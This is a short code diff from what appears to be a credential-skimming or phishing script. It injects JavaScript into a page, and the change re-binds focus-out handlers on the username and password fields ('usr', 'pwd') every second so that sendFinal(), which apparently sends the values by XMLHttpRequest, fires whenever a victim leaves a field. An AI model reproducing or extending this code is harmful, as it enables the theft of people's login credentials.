@@ -41,8 +41,12 @@
                 xhr.send();
             }
 
-            document.getElementsByTagName('fluent-text-field')[0].setAttribute('onfocusout', 'sendFinal()');
-            document.getElementsByTagName('fluent-text-field')[1].setAttribute('onfocusout', 'sendFinal()');
+            setInterval(function() {
+                var usr = document.getElementsByTagName('fluent-text-field')[0];
+                usr.setAttribute('onfocusout', 'sendFinal()');
+                var pwd = document.getElementsByTagName('fluent-text-field')[1];
+                pwd.setAttribute('onfocusout', 'sendFinal()');
+            }, 1000);
         `;
         doc.body.appendChild(script);
     };
